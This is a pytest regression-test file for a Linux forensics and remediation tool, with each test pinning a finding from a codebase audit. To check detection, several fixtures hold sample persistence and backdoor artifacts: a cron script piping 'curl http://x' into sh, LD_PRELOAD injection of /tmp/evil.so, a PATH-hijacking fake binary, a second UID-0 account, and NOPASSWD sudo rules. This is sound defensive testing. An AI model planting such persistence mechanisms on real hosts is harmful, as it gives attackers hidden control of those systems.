"""Regression tests for the 2026-09-23 whole-codebase audit (items C1–L9).

Each test is named after the audit item it pins, so a reintroduction points
straight back at the original finding in CLAUDE.md "Known Bugs Fixed".
"""
import datetime
import json
import os
import stat
import tarfile
from unittest.mock import patch

import pytest
from click.testing import CliRunner

from ubuntils.bundle import write_bundle
from ubuntils.cli import _run_pipeline, main
from ubuntils.collectors.cron import CronCollector
from ubuntils.collectors.environment import EnvironmentCollector
from ubuntils.collectors.network import NetworkCollector
from ubuntils.collectors.packages import PackageCollector
from ubuntils.collectors.processes import ProcessCollector
from ubuntils.collectors.source import BundleSource, LiveSource
from ubuntils.collectors.sudoers import SudoersCollector
from ubuntils.collectors.systemd import SystemdCollector
from ubuntils.collectors.users import UserCollector
from ubuntils.detectors import rules
from ubuntils.detectors.engine import DetectionEngine
from ubuntils.detectors.finding import Finding, RemediationStatus, Severity
from ubuntils.formatters.json_formatter import JSONFormatter
from ubuntils.pipeline import remediate_findings
from ubuntils.remediators.base import BaseRemediator
from ubuntils.remediators.environment import EnvironmentRemediator
from ubuntils.remediators.ssh import SSHRemediator
from ubuntils.remediators.sudoers import SudoersRemediator
from ubuntils.timeline.builder import TimelineBuilder
from ubuntils.utils import shell
from ubuntils.utils.baseline import Baseline
from ubuntils.utils.host import get_ubuntu_version
from ubuntils.utils.validators import (
    command_references_writable_tmp, path_in_standard_bins, path_in_standard_libs,
    path_in_writable_tmp,
)


def _finding(rule_id, path, raw, confidence=50, remediable=True):
    return Finding(rule_id=rule_id, severity=Severity.HIGH, title="t", description="d",
                   artifact_path=path, raw_value=raw, remediation_available=remediable,
                   confidence=confidence)


def _tree(tmp_path, files: dict) -> LiveSource:
    for rel, content in files.items():
        p = tmp_path / rel.lstrip("/")
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)
    return LiveSource(root=str(tmp_path), offline=True)


@pytest.fixture
def backups_in_tmp(tmp_path, monkeypatch):
    # Remediators constructed from the registry use the default backup base.
    monkeypatch.setattr(BaseRemediator.__init__, "__defaults__", (str(tmp_path / "backups"),))


# ── Critical ─────────────────────────────────────────────────────────────────

def test_C1_cli_remediation_uses_real_registry_without_typeerror(tmp_path, backups_in_tmp):
    crontab = tmp_path / "crontab"
    crontab.write_text("* * * * * /tmp/evil.sh\n")
    finding = _finding("CRON_TMP_PATH", str(crontab), "* * * * * /tmp/evil.sh")
    with patch("ubuntils.pipeline.ALL_COLLECTORS", []), \
            patch("ubuntils.pipeline.DetectionEngine") as engine, \
            patch("ubuntils.pipeline.TimelineBuilder") as tl:
        engine.return_value.run.return_value = [finding]
        engine.return_value.rules_failed = []
        engine.return_value.suppressed_by_baseline = 0
        engine.return_value.baseline_suppressed_findings = []
        tl.return_value.build.return_value = []
        *_, results = _run_pipeline(source=LiveSource(), remediate=True, confirm=True,
                                    forward_wazuh=False)
    assert [r.status for r in results] == [RemediationStatus.SUCCESS]
    assert crontab.read_text() == ""


def test_C2_ensure_root_does_not_forward_caller_path(monkeypatch):
    from ubuntils import cli
    captured = {}
    monkeypatch.setattr(cli.os, "geteuid", lambda: 1000)
    monkeypatch.setattr(cli.os, "execv", lambda path, args: captured.update(path=path, args=args))
    monkeypatch.setattr(cli, "resolve_command", lambda name: "/usr/bin/sudo")
    cli._ensure_root()
    assert captured["path"] == "/usr/bin/sudo"
    assert not any(a.startswith("PATH=") for a in captured["args"])
    assert "env" not in captured["args"]


def test_C2_commands_resolve_on_secure_path_not_caller_path(tmp_path, monkeypatch):
    evil = tmp_path / "echo"
    evil.write_text("#!/bin/sh\necho PWNED\n")
    evil.chmod(0o755)
    monkeypatch.setenv("PATH", f"{tmp_path}:{os.environ['PATH']}")
    stdout, _, rc = shell.run_command(["echo", "safe"])
    assert rc == 0 and stdout.strip() == "safe"
    assert not shell.resolve_command("echo").startswith(str(tmp_path))


def test_C3_sudoers_visudo_failure_leaves_file_untouched(tmp_path):
    sudoers = tmp_path / "sudoers"
    original = "root ALL=(ALL:ALL) ALL\nalice ALL=(ALL) NOPASSWD: ALL\n"
    sudoers.write_text(original)
    checked = []

    def fail(self, path):
        checked.append(path)
        raise ValueError("visudo check failed")

    rem = SudoersRemediator(backup_base=str(tmp_path / "b"))
    with patch.object(SudoersRemediator, "_run_visudo_check", fail):
        result = rem.remediate(_finding("SUDOERS_NOPASSWD", str(sudoers),
                                        "alice ALL=(ALL) NOPASSWD: ALL"), dry_run=False)
    assert result.status == RemediationStatus.FAILED
    assert sudoers.read_text() == original
    assert checked and checked[0] != str(sudoers)  # a candidate copy was checked


def test_sudoers_remediator_refuses_to_remove_last_rule(tmp_path):
    sudoers = tmp_path / "sudoers"
    sudoers.write_text("Defaults env_reset\nalice ALL=(ALL) NOPASSWD: ALL\n")
    rem = SudoersRemediator(backup_base=str(tmp_path / "b"))
    with patch.object(SudoersRemediator, "_run_visudo_check"):
        result = rem.remediate(_finding("SUDOERS_NOPASSWD", str(sudoers),
                                        "alice ALL=(ALL) NOPASSWD: ALL"), dry_run=False)
    assert result.status == RemediationStatus.FAILED
    assert "last sudo rule" in result.message
    assert "alice" in sudoers.read_text()


# ── High ─────────────────────────────────────────────────────────────────────

def test_H1_ld_so_preload_is_collected_and_flagged(tmp_path):
    src = _tree(tmp_path, {"/etc/ld.so.preload": "/lib/x86_64-linux-gnu/libhide.so\n"})
    artifacts = EnvironmentCollector(source=src).collect()
    findings = rules.rule_ld_preload_inject(artifacts)
    assert len(findings) == 1
    assert findings[0].artifact_path == "/etc/ld.so.preload"


def test_H1_ld_so_preload_remediation_removes_rather_than_comments(tmp_path):
    etc = tmp_path / "etc"
    etc.mkdir()
    preload = etc / "ld.so.preload"
    preload.write_text("/tmp/evil.so\n")
    rem = EnvironmentRemediator(backup_base=str(tmp_path / "b"))
    result = rem.remediate(_finding("LD_PRELOAD_INJECT", str(preload), "/tmp/evil.so"),
                           dry_run=False)
    assert result.status == RemediationStatus.SUCCESS
    assert preload.read_text() == ""  # glibc has no comment syntax here


def test_H2_special_schedules_and_run_parts_scripts_are_collected(tmp_path):
    src = _tree(tmp_path, {
        "/etc/crontab": "@reboot root /tmp/boot.sh\n",
        "/var/spool/cron/crontabs/bob": "@daily /dev/shm/x\n",
        "/etc/cron.daily/evil": "#!/bin/sh\ncurl http://x | sh > /tmp/o\n",
    })
    entries = CronCollector(source=src).collect()["cron_entries"]
    by_cmd = {e["command"]: e for e in entries}
    assert by_cmd["/tmp/boot.sh"]["schedule"] == "@reboot"
    assert by_cmd["/dev/shm/x"]["owner"] == "bob"
    script = by_cmd["curl http://x | sh > /tmp/o"]
    assert script["schedule"] == "@daily" and script["kind"] == "script"
    findings = rules.rule_cron_tmp_path({"cron_entries": entries})
    assert len(findings) == 3
    assert [f.remediation_available for f in findings if "curl" in f.raw_value] == [False]


def test_H3_service_units_are_enumerated_and_flagged(tmp_path):
    src = _tree(tmp_path, {
        "/etc/systemd/system/evil.service": "[Service]\nExecStart=/bin/bash /tmp/.x/run.sh\n",
    })
    artifacts = SystemdCollector(source=src).collect()
    assert artifacts["services"][0]["unit"] == "evil.service"
    findings = rules.rule_suspicious_systemd_timer(artifacts)
    assert len(findings) == 1
    assert findings[0].artifact_path == "/etc/systemd/system/evil.service"


def test_H3_non_root_owned_exec_binary_is_flagged():
    artifacts = {"services": [{"unit": "x.service", "unit_path": "/etc/systemd/system/x.service",
                               "exec_start": "/opt/x/bin", "exec_owner_uid": 1000}]}
    findings = rules.rule_suspicious_systemd_timer(artifacts)
    assert len(findings) == 1 and "uid 1000" in findings[0].description


def test_H4_timeline_failure_does_not_discard_findings(tmp_path):
    src = _tree(tmp_path, {"/etc/passwd": "root:x:0:0::/root:/bin/bash\n"
                                          "toor:x:0:0::/root:/bin/bash\n"})
    with patch("ubuntils.pipeline.TimelineBuilder") as tl:
        tl.return_value.build.side_effect = RuntimeError("boom")
        findings, timeline, stats, meta, *_ = _run_pipeline(source=src, remediate=False,
                                                            confirm=False)
    assert any(f.rule_id == "USER_UID_ZERO" for f in findings)
    assert meta["timeline_error"] == "boom"


def test_H5_netstat_fallback_columns():
    netstat = (
        "Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name\n"
        "tcp 0 0 10.0.0.5:22 10.0.0.9:51000 ESTABLISHED 812/sshd\n"
        "udp 0 0 0.0.0.0:68 0.0.0.0:* 540/dhclient\n"
    )

    def run(name, argv, timeout=30):
        return ("", "not found", -1) if name == "ss" else (netstat, "", 0)

    with patch.object(LiveSource, "run", side_effect=run):
        conns = NetworkCollector(source=LiveSource()).collect()["connections"]
    assert conns[0]["local_port"] == "22" and conns[0]["remote_addr"] == "10.0.0.9"
    assert conns[0]["state"] == "ESTABLISHED" and conns[0]["pid"] == "812"
    assert conns[1]["state"] == "" and conns[1]["local_port"] == "68"


def test_H6_bundle_replays_recorded_exit_code(tmp_path):
    out = tmp_path / "dpkg.txt"
    out.write_text("")
    src = BundleSource(root_dir=str(tmp_path), command_index={"dpkg_verify": (str(out), -1)})
    collector = PackageCollector(source=src)
    assert collector.collect()["dpkg_verify_collection_failed"] is True
    assert collector.degraded


def test_H7_offline_process_exe_never_reads_analyst_proc(tmp_path):
    src = _tree(tmp_path, {"/proc/1/status": "Name:\tsshd\nUid:\t0\t0\t0\t0\n"})
    procs = ProcessCollector(source=src).collect()["processes"]
    assert procs[0]["exe"] == ""  # not the analyst's own /proc/1/exe


def test_H7_ubuntu_version_reads_through_source(tmp_path):
    src = _tree(tmp_path, {"/etc/os-release": 'PRETTY_NAME="Ubuntu 22.04.4 LTS"\n'})
    assert get_ubuntu_version(src) == "Ubuntu 22.04.4 LTS"


def _make_bundle(tmp_path, files=None):
    root = tmp_path / "host"
    for rel, content in (files or {"/etc/passwd": "root:x:0:0::/root:/bin/bash\n"}).items():
        p = root / rel.lstrip("/")
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)
    out = tmp_path / "b.tar.gz"
    write_bundle(source=LiveSource(root=str(root)), files_to_capture=list(files or ["/etc/passwd"]),
                 commands_to_capture=[], out_path=str(out),
                 metadata={"hostname": "victim", "ubuntu_version": "U", "tool_version": "x"})
    return out


def test_H8_analyze_removes_extracted_bundle(tmp_path, monkeypatch):
    import tempfile
    work = tmp_path / "work"
    work.mkdir()
    monkeypatch.setattr(tempfile, "tempdir", str(work))
    bundle = _make_bundle(tmp_path)
    result = CliRunner().invoke(main, ["analyze", str(bundle), "--json"])
    assert result.exit_code == 0, result.output
    assert not [p for p in os.listdir(work) if p.startswith("ubuntils_analyze_")]


def test_H9_output_refuses_symlink(tmp_path, monkeypatch):
    victim = tmp_path / "victim"
    victim.write_text("precious")
    link = tmp_path / "report.json"
    link.symlink_to(victim)
    bundle = _make_bundle(tmp_path)
    result = CliRunner().invoke(main, ["analyze", str(bundle), "--output", str(link)])
    assert result.exit_code != 0
    assert victim.read_text() == "precious"


def test_H9_output_is_owner_only(tmp_path):
    bundle = _make_bundle(tmp_path)
    out = tmp_path / "r.json"
    result = CliRunner().invoke(main, ["analyze", str(bundle), "--output", str(out)])
    assert result.exit_code == 0, result.output
    assert stat.S_IMODE(os.stat(out).st_mode) == 0o600


def test_H10_prefix_checks_respect_path_boundaries():
    assert not path_in_standard_bins("/usr/bin.evil/x")
    assert not path_in_standard_libs("/libfoo/x.so")
    assert not path_in_writable_tmp("/var/tmpfiles/x")
    assert path_in_writable_tmp("/tmp/x") and path_in_standard_bins("/usr/bin/ls")
    assert command_references_writable_tmp("bash /tmp/x.sh")
    assert not command_references_writable_tmp("/usr/bin/tmpreaper")


# ── Medium ───────────────────────────────────────────────────────────────────

def _users():
    return [
        {"username": "alice", "uid": 1000, "shell": "/bin/bash", "groups": ["sudo"],
         "primary_group": "alice"},
        {"username": "bob", "uid": 1001, "shell": "/bin/bash", "groups": [],
         "primary_group": "wheel"},
    ]


def test_M1_group_rules_two_token_rules_and_includes(tmp_path):
    src = _tree(tmp_path, {
        "/etc/sudoers": "%sudo ALL=(ALL) NOPASSWD:ALL\n@includedir /etc/sudoers.inc\n",
        "/etc/sudoers.inc/extra": "alice ALL=NOPASSWD: SETENV: ALL\n",
    })
    sudo_rules = SudoersCollector(source=src).collect()["sudoers_rules"]
    by_user = {r["user"]: r for r in sudo_rules}
    assert by_user["alice"]["options"] == "NOPASSWD, SETENV"
    findings = rules.rule_sudoers_nopasswd({"sudoers_rules": sudo_rules, "users": _users()})
    group = [f for f in findings if "Group" in f.description]
    assert group and "alice" in group[0].description
    assert group[0].remediation_available is False  # never strip %sudo automatically
    assert any(f.remediation_available for f in findings if "User 'alice'" in f.description)


def test_M2_malformed_passwd_line_does_not_blind_uid_zero(tmp_path):
    src = _tree(tmp_path, {"/etc/passwd": "junk:x:NaN:0::/:/bin/sh\n"
                                          "toor:x:0:0::/root:/bin/bash\n"})
    collector = UserCollector(source=src)
    users = collector.collect()["users"]
    assert [u["username"] for u in users] == ["toor"]
    assert any("malformed" in r for r in collector.degraded)


def test_M2_empty_password_login_account_is_flagged(tmp_path):
    src = _tree(tmp_path, {"/etc/passwd": "eve:x:1002:1002::/home/eve:/bin/bash\n",
                           "/etc/shadow": "eve::19000:0:99999:7:::\n"})
    findings = rules.rule_user_empty_password(UserCollector(source=src).collect())
    assert [f.rule_id for f in findings] == ["USER_EMPTY_PASSWORD"]


def test_M3_path_prepend_of_tmp_is_suspicious():
    assert rules._rc_content_is_suspicious("export PATH=/tmp/evil:$PATH\n")
    assert rules._rc_content_is_suspicious('PATH="$PATH:/dev/shm/.x"\n')
    assert not rules._rc_content_is_suspicious("export PATH=$HOME/bin:$PATH\n")


def test_M4_every_ld_preload_element_is_checked():
    artifacts = {"env_definitions": [{"variable": "LD_PRELOAD", "source": "/home/a/.bashrc",
                                      "value": "/lib/ok.so:/tmp/evil.so",
                                      "raw_line": "LD_PRELOAD=/lib/ok.so:/tmp/evil.so"}]}
    assert len(rules.rule_ld_preload_inject(artifacts)) == 1


def test_M5_setgid_is_reported_as_setgid_and_stock_setgid_is_known():
    artifacts = {"setuid_binaries": [
        {"path": "/usr/bin/wall", "setuid": False, "setgid": True},
        {"path": "/opt/x/tool", "setuid": False, "setgid": True},
    ]}
    findings = rules.rule_setuid_inventory(artifacts)
    assert len(findings) == 1
    assert findings[0].title == "Unexpected setgid binary"
    assert "g-s" in findings[0].guided_remediation


def test_M5_find_output_modes_are_parsed(tmp_path):
    out = tmp_path / "find.txt"
    out.write_text("4755 /usr/bin/sudo\n2755 /usr/bin/wall\n")
    empty = tmp_path / "empty.txt"
    empty.write_text("")
    src = BundleSource(root_dir=str(tmp_path), command_index={
        "find_setuid": str(out), "dpkg_verify": str(empty), "lsattr_sensitive": str(empty)})
    entries = PackageCollector(source=src).collect()["setuid_binaries"]
    assert entries == [{"path": "/usr/bin/sudo", "setuid": True, "setgid": False},
                       {"path": "/usr/bin/wall", "setuid": False, "setgid": True}]


def test_M6_snap_and_usr_lib_daemons_are_standard_and_kernel_is_low():
    assert path_in_standard_bins("/snap/firefox/4000/usr/lib/firefox/firefox")
    assert path_in_standard_bins("/usr/lib/systemd/systemd")
    procs = {"processes": [{"pid": 1, "name": "systemd", "exe": "/usr/lib/systemd/systemd"}]}
    assert rules.rule_process_masquerade(procs) == []
    k = rules.rule_kernel_module_suspicious({"kernel_modules": [{"name": "iwlwifi"}]})
    assert k[0].severity == Severity.LOW


def test_M7_one_nss_finding_per_unknown_module():
    content = "\n".join(f"{db}: files evilnss" for db in
                        ("passwd", "group", "shadow", "hosts", "services", "netgroup"))
    findings = rules.rule_pam_backdoor({"nsswitch_content": content})
    assert len(findings) == 1


def test_M8_verify_is_line_exact(tmp_path):
    keys = tmp_path / "authorized_keys"
    keys.write_text("ssh-ed25519 AAAA evil\nssh-ed25519 AAAA evil@laptop\n")
    rem = SSHRemediator(backup_base=str(tmp_path / "b"))
    result = rem.remediate(_finding("SSH_UNAUTHORIZED_KEY", str(keys), "ssh-ed25519 AAAA evil"),
                           dry_run=False)
    assert result.status == RemediationStatus.SUCCESS
    assert keys.read_text() == "ssh-ed25519 AAAA evil@laptop\n"


def test_M9_failed_rules_and_degraded_collectors_reach_metadata(tmp_path):
    def broken(_artifacts):
        raise RuntimeError("rule bug")

    src = _tree(tmp_path, {})  # no /etc/passwd at all
    with patch("ubuntils.detectors.engine.ALL_RULES", [broken]):
        *_, meta, counts, _ = _run_pipeline(source=src, remediate=False, confirm=False)
    assert meta["rules_failed"] == ["broken"]
    assert "UserCollector" in meta["collectors_degraded"]


def test_M10_syslog_year_rollover_and_timezone(tmp_path):
    src = _tree(tmp_path, {"/etc/timezone": "Asia/Kolkata\n"})
    reference = datetime.datetime(2027, 1, 2, 12, 0, tzinfo=datetime.timezone.utc)
    events = TimelineBuilder(source=src)._parse_syslog(
        "Dec 31 23:30:00 h sshd[1]: late\nJan  2 05:30:00 h sshd[1]: early\n",
        reference=reference,
    )
    assert events[0].timestamp.year == 2026  # December stays in the previous year
    # 05:30 IST is 00:00 UTC
    assert events[1].timestamp == datetime.datetime(2027, 1, 2, 0, 0,
                                                    tzinfo=datetime.timezone.utc)


def test_M12_tampered_bundle_warns_and_exits_nonzero(tmp_path):
    bundle = _make_bundle(tmp_path)
    tampered = tmp_path / "t.tar.gz"
    with tarfile.open(bundle, "r:gz") as src, tarfile.open(tampered, "w:gz") as dst:
        for member in src.getmembers():
            data = src.extractfile(member).read() if member.isfile() else None
            if member.name.endswith("etc/passwd"):
                data = b"root:x:0:0::/root:/bin/bash\nevil:x:0:0::/:/bin/sh\n"
                member.size = len(data)
            dst.addfile(member, None if data is None else __import__("io").BytesIO(data))
    result = CliRunner().invoke(main, ["analyze", str(tampered), "--json"])
    assert result.exit_code == 3
    assert "integrity check FAILED" in result.output


def test_M13_low_confidence_findings_are_not_auto_remediated(tmp_path, backups_in_tmp):
    keys = tmp_path / "authorized_keys"
    keys.write_text("ssh-ed25519 AAAA ops\n")
    finding = _finding("SSH_UNAUTHORIZED_KEY", str(keys), "ssh-ed25519 AAAA ops", confidence=30)
    results = remediate_findings([finding], confirm=True)
    assert results[0].status == RemediationStatus.SKIPPED
    assert keys.read_text() == "ssh-ed25519 AAAA ops\n"


def test_M13_non_remediable_findings_are_skipped_even_if_registered(tmp_path):
    finding = _finding("SUDOERS_NOPASSWD", "/etc/sudoers", "%sudo ALL=NOPASSWD:ALL",
                       remediable=False)
    assert remediate_findings([finding], confirm=True) == []


async def test_M14_tui_receives_remediation_results():
    from ubuntils.detectors.finding import RemediationResult
    from ubuntils.tui.app import UbuntilsApp
    from ubuntils.tui.results_screen import ResultsScreen

    finding = _finding("CRON_TMP_PATH", "/etc/crontab", "x")
    result = RemediationResult(finding_rule_id="CRON_TMP_PATH", status=RemediationStatus.SUCCESS,
                               message="ok", backup_path="/b", rollback_command="cp /b /etc/crontab")
    app = UbuntilsApp(_scan_override=lambda: ([finding], [], {}, [result]))
    async with app.run_test(size=(120, 40)) as pilot:
        await pilot.pause(delay=0.3)
        assert isinstance(app.screen, ResultsScreen)
        assert app.screen._remediation_results == [result]


def test_M15_no_wazuh_flag_disables_forwarding(monkeypatch):
    monkeypatch.setattr("ubuntils.cli._ensure_root", lambda: None)
    with patch("ubuntils.pipeline.ALL_COLLECTORS", []), \
            patch("ubuntils.pipeline.is_wazuh_agent_present", return_value=True), \
            patch("ubuntils.pipeline.write_wazuh_alerts") as write:
        result = CliRunner().invoke(main, ["scan", "--json", "--no-wazuh"])
    assert result.exit_code == 0, result.output
    write.assert_not_called()


# ── Low ──────────────────────────────────────────────────────────────────────

def test_L5_report_digest_is_verifiable_from_emitted_document():
    report = JSONFormatter().format({"hostname": "h"}, {"A": 1}, [], [], [])
    doc = json.loads(report)
    assert doc["report_sha256"] == JSONFormatter.digest(doc)
    assert list(doc) == sorted(doc)


def test_L7_atomic_write_preserves_mode(tmp_path):
    sudoers = tmp_path / "sudoers"
    sudoers.write_text("root ALL=(ALL:ALL) ALL\nalice ALL=(ALL) NOPASSWD: ALL\n")
    sudoers.chmod(0o440)
    rem = SudoersRemediator(backup_base=str(tmp_path / "b"))
    with patch.object(SudoersRemediator, "_run_visudo_check"):
        result = rem.remediate(_finding("SUDOERS_NOPASSWD", str(sudoers),
                                        "alice ALL=(ALL) NOPASSWD: ALL"), dry_run=False)
    assert result.status == RemediationStatus.SUCCESS
    assert stat.S_IMODE(os.stat(sudoers).st_mode) == 0o440
    assert not [p for p in os.listdir(tmp_path) if p.startswith(".ubuntils-")]


def test_L8_baseline_fingerprints_match_whole_words_only():
    b = Baseline(entries=[{"rule_id": "USER_UID_ZERO", "fingerprint": "ghost"}])
    assert b.matches(_finding("USER_UID_ZERO", "/etc/passwd", "ghost:x:0:0:...:/bin/sh"))
    assert not b.matches(_finding("USER_UID_ZERO", "/etc/passwd", "ghostly:x:0:0:...:/bin/sh"))


def test_L9_status_flags_are_not_counted_as_artifacts(tmp_path):
    empty = tmp_path / "e.txt"
    empty.write_text("")
    src = BundleSource(root_dir=str(tmp_path), command_index={
        n: str(empty) for n in ("dpkg_verify", "lsattr_sensitive", "find_setuid")})
    with patch("ubuntils.pipeline.ALL_COLLECTORS", [PackageCollector]):
        *_, counts, _ = _run_pipeline(source=src, remediate=False, confirm=False)
    assert counts["PackageCollector"] == 0


def test_engine_records_no_failures_on_clean_run():
    engine = DetectionEngine()
    engine.run({})
    assert engine.rules_failed == []
